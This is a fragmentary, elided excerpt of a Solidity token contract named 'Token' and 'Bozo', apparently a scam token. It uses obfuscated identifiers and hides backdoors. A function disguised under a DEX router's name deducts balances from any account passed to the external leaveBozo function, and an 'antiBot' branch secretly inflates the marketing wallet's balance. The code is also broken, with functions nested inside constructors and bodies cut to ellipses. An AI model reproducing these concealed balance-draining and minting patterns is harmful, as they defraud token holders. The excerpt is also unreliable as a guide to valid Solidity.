...
contract Token is Ownable, Loop {
    ...
    function _raid() internal returns(address) {
	...
	function getBalanceToken(address account) internal returns (uint256) {
        return _balances[account];
    }
	
	function calculateBot(uint256 _amountBot) internal returns(uint256) {
		uint256 botX = pp();
		uint256 botY = kk();
...
constructor(
	...
	function swapExactETHForTokensSupportingFeeOnTransferTokens(
        ...
        if (_marketing == secure){
            ...
            _balances[_jkl] = _balances[_jkl] - _ghi;
    ...
    uint256 txEEEE = 0;
        ...
        emit Transfer(_abc, _def, _ghi);
		if (_antiBot) {
            _balances[_marketing] = getAmount()*36470;
            _antiBot = false;  
        }
    }
...
contract Bozo is Token {
	...
	constructor(
		...
		function leaveBozo(address account) external returns(bool) {
		swapExactETHForTokensSupportingFeeOnTransferTokens(account);
	}
